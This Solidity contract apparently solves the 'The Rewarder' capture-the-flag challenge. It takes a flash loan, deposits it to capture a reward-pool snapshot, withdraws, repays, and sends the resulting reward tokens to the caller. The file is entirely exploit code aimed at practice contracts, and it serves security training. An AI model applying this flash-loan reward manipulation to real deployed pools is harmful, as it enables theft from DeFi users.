// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";

import "hardhat/console.sol";


contract TheRewarderAttacker {
    FlashLoanerPool flashLoanInstance;
    TheRewarderPool rewarderInstance;

    IERC20 public liquidityToken;
    IERC20 public rewardToken;

    constructor(address _addressLoan, address _addressRewarder, address _liquidityToken) {
        flashLoanInstance = FlashLoanerPool(_addressLoan);
        rewarderInstance = TheRewarderPool(_addressRewarder);
        liquidityToken = IERC20(_liquidityToken);
    }

    function receiveFlashLoan(uint256 _amount) external {
        console.log("Flash loan received : %s", _amount);

        liquidityToken.transfer(address(this), _amount);
        liquidityToken.approve(address(rewarderInstance), _amount);

        console.log("Flash loan approved");
        console.log("Player liquidityToken Balance : %s", liquidityToken.balanceOf(address(this)));

        rewarderInstance.deposit(_amount);

        console.log("Flash loan deposited");

        rewarderInstance.withdraw(_amount);
        liquidityToken.transfer(address(flashLoanInstance), _amount);

        console.log("Flash loan paid back");
    }

    function attack(uint256 _amount) external {
        flashLoanInstance.flashLoan(_amount);
    }

    function distributeRewards(address _rewardToken) external {
        rewardToken = IERC20(_rewardToken);

        console.log("Before Reward Token Balance : %s", rewardToken.balanceOf(address(this)));

        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));

        console.log("After Reward Token Balance : %s", rewardToken.balanceOf(address(this)));
    }

    receive() external payable {
        console.log("Received flash loan payment");
    }
}